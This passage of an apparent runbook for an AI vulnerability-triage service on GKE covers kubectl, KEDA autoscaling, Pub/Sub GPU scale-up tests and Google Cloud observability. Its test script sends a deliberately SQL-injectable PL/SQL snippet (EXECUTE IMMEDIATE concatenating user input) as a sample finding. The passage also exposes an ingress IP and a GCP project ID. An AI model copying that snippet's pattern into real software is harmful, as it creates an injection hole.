          "description": "SQL Injection: Dynamic concatenation in EXECUTE IMMEDIATE without bind variables."
        }
      }
    ]
  }'
```

### 10.3 Poll Triage Status via Ingress (`GET /v1/scan-status/{image_sha}`)
Query the ledger and governance approval status for the ingested scan:
```bash
curl -s "http://34.8.57.243/v1/scan-status/sha256:oracle_billing_core_run_2026" | jq .
```

---

## 11. GKE `ai-stack` Namespace Status Inspection

The core multi-agent swarm (`oneshield-app`), SGLang GPU server (`sglang-server`), and KEDA autoscaler reside in the **`ai-stack`** namespace.

### 11.1 Inspect Pods, Deployments, and ScaledObjects
```bash
# Check all resources in the ai-stack namespace
kubectl get pods,deployments,scaledobjects,hpa,svc -n ai-stack
```

**Healthy Baseline State (Idle / Scale-to-Zero):**
```text
NAME                                  READY   STATUS    RESTARTS   AGE
pod/oneshield-app-c897f9fc-vqgtj      1/1     Running   0          25m

NAME                              READY   UP-TO-DATE   AVAILABLE   AGE
deployment.apps/oneshield-app     1/1     1            1           10d
deployment.apps/sglang-server     0/0     0            0           10d

NAME                                        SCALETARGETNAME   MIN   MAX   READY   ACTIVE
scaledobject.keda.sh/sglang-pubsub-scaler   sglang-server     0     1     True    False
```

### 11.2 Check KEDA Autoscaler Configuration & Activity
```bash
kubectl describe scaledobject sglang-pubsub-scaler -n ai-stack
```
Look for:
* `Ready: True` (KEDA trigger authentication connected to GCP Workload Identity).
* `Active: False` (Queue depth is currently 0; deployment is idle at 0 replicas).
* `Triggers Activity: ... isActive: false`.

### 11.3 Stream Multi-Agent Swarm Logs in Real Time
```bash
# Follow logs with structured JSON and trace IDs
kubectl logs deployment/oneshield-app -n ai-stack -f --tail=50
```

---

## 12. Google Cloud Pub/Sub Queue Verification & GPU Scale-Up Test

### 12.1 Inspect Topic and Subscription Status
Verify that Google Cloud Pub/Sub resources are active:
```bash
# List topic details
gcloud pubsub topics describe vulnerability-scan-queue --project=project-517889ec-8518-4856-a51

# Check subscription backlog
gcloud pubsub subscriptions describe vulnerability-scan-worker-sub --project=project-517889ec-8518-4856-a51
```

### 12.2 Dispatch Relevant Alerts to Trigger GPU Autoscaling
To trigger the GPU, alerts must **not** be benign (or Jev will fast-discard them at $0 GPU cost). Dispatch active CISA KEV mandate findings using the scratch test script or REST API:

```python
# scratch/trigger_gpu_test.py
import json, base64, subprocess, requests

PROJECT_ID = "project-517889ec-8518-4856-a51"
TOPIC_ID = "vulnerability-scan-queue"

# CISA KEV Exploitable Finding (Bypasses benign filter -> Forces GPU patch generation)
alert = {
    "vulnerability_id": "CVE-2023-34362",
    "code_snippet": "EXECUTE IMMEDIATE 'SELECT * FROM transfers WHERE transfer_id = ''' || user_input || '''';",
    "metadata": {
        "language": "oracle_plsql",
        "severity": "CRITICAL",
        "cisa_kev": True,
        "epss_score": 0.98
    },
    "governance_tier": "TIER_3_INTERNAL_DEV",
    "quorum_signatures": []
}

token = subprocess.check_output("gcloud auth print-access-token", shell=True).decode().strip()
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
url = f"https://pubsub.googleapis.com/v1/projects/{PROJECT_ID}/topics/{TOPIC_ID}:publish"

b64_data = base64.b64encode(json.dumps(alert).encode()).decode()
res = requests.post(url, headers=headers, json={"messages": [{"data": b64_data}]})
print(res.json())
```

Execute the test:
```powershell
& "C:\myailearn\projects\Vulnerability_management\.venv\Scripts\python.exe" "C:\Users\azureadmin\.gemini\antigravity\brain\6add14cb-6937-42cd-98db-d814bf3654f1\scratch\trigger_gpu_test.py"
```

### 12.3 Observe KEDA Scale-Up and GKE Autopilot Provisioning
Immediately after publishing:
1. **KEDA flips to Active:**
   ```bash
   kubectl get scaledobject sglang-pubsub-scaler -n ai-stack
   # Output: ACTIVE=True
   ```
2. **SGLang Replicas Scale 0 -> 1:**
   ```bash
   kubectl get deployment sglang-server -n ai-stack
   # Output: READY 0/1, UP-TO-DATE 1
   ```
3. **Pod Created with L4 GPU Request:**
   ```bash
   kubectl get pods -n ai-stack -l app=sglang
   # Output: sglang-server-xxxxx (Pending -> ContainerCreating -> Running)
   ```
4. **GKE Autopilot Node Auto-Provisioner (NAP) Event:**
   ```bash
   kubectl describe pod -l app=sglang -n ai-stack | Select-String "TriggeredScaleUp"
   # Output: Pod triggered scale-up: [{.../zones/us-central1-b/instanceGroups/nap-... 0->1}]
   ```
5. **Scale-to-Zero Verification:**
   After alerts are triaged and acknowledged, KEDA counts down the `cooldownPeriod: 300` (5 minutes) and scales `sglang-server` back to 0 replicas.

---

## 13. Observability: Cloud Logging, Trace, and Prometheus (GMP)

### 13.1 Google Cloud Structured Logging & Trace Correlation
All application logs are emitted as structured JSON adhering to Google Cloud Logging schema with trace correlation:

```bash
# Read structured logs from ai-stack container
gcloud logging read 'resource.type="k8s_container" AND resource.labels.namespace_name="ai-stack" AND resource.labels.container_name="app"' --limit=10 --project=project-517889ec-8518-4856-a51
```

**Filter by Security Attribute:**
* Filter by CVE: `'jsonPayload.vulnerability_id="CVE-2023-34362"'`
* Filter by State Hash: `'jsonPayload.state_hash=~"^[a-f0-9]{64}$"'`
* Filter by Circuit Breaker Trips: `'jsonPayload.circuit_breaker_tripped=true'`

### 13.2 Google Cloud Distributed Trace (OpenTelemetry)
Each Pub/Sub triage job initiates an OpenTelemetry root span with parent-child propagation:
* Root Span: `pubsub_triage_job`
  * Child: `jev_system1_pre_router` (attributes: `is_cisa_kev`, `latency_ms`, `decision`)
  * Child: `judge_a_reachability` (attributes: `is_reachable`, `confidence`, `model`)
  * Child: `judge_b_governance` (attributes: `is_reachable`, `confidence`, `model`)
  * Child: `generate_patch` (attributes: `lora_adapter`, `retry_count`)
  * Child: `validate_patch_gates` (attributes: `gate_1_ast`, `gate_2_secrets`, `gate_3_safety_score`)

Navigate directly to Cloud Trace in GCP Console:
```
https://console.cloud.google.com/traces/list?project=project-517889ec-8518-4856-a51
```

### 13.3 Google Managed Prometheus (GMP) Custom AI Metrics
Scrape custom AI metrics directly from the running pod:
```powershell
kubectl exec -n ai-stack deployment/oneshield-app -- python -c "import urllib.request; data = urllib.request.urlopen('http://localhost:8080/metrics').read().decode(); print('\n'.join([line for line in data.splitlines() if 'oneshield_' in line]))"
```

**Key Metrics & Verification Checks:**
* **`oneshield_triage_total`**: Verifies total scans processed by tier, severity, and resolution status.
* **`oneshield_jev_decisions_total`**: Verifies count of `MANDATE_EMERGENCY_FAST_PATH` vs `FAST_DISCARD` decisions.
* **`oneshield_jev_latency_seconds_bucket`**: Confirms sub-millisecond execution ($<0.0005\,\text{s}$).
* **`oneshield_gate3_safety_score`**: Monitors distribution of patch safety scores (target $\ge 0.85$).
* **`oneshield_gpu_bypassed_total`**: Tracks cumulative findings discarded at $0 GPU cost.

### 13.4 Cloud Monitoring Alert Policies
Verify active alerting policies in `monitoring.tf`:
1. **Confidence Circuit Breaker Alert**: Triggers when `oneshield_circuit_breaker_total` rate $> 0.05$ (low-confidence triage).
2. **State Hash Zero-Trust Alert**: Emitted if any state handoff fails SHA-256 validation.
3. **CISA KEV 24h SLA Breach Alert**: Triggers if un-remediated active exploits exceed the 24-hour federal mandate window.

